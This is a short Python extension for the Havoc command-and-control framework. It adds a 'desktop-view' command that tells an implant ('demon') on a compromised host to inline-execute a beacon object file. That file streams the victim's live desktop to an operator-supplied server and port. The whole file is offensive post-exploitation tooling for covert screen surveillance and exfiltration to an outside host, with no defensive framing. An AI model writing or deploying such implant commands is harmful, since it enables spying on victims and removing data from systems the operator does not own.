from havoc import Demon, RegisterCommand, RegisterModule

def livedesktop( demonID, *params ):
    TaskID : str   = None
    demon  : Demon = None
    packer = Packer()
    demon  = Demon( demonID )

    num_params = len(params)
    if num_params < 2:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Usage: desktop-view <server> <port>" )
        return False

    server = params[0]
    port   = params[1]

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to stream desktop to {server}:{port}" )
    packer.addstr( server )
    packer.addint( int(port) )
    demon.InlineExecute( TaskID, "go", "bin/livedesktop.x64.o", packer.getbuffer(), False )
    return TaskID

RegisterCommand( livedesktop, "", "desktop-view", "Stream live desktop capture to the viewer", 0, "<server> <port>", "192.168.1.10 1337" )
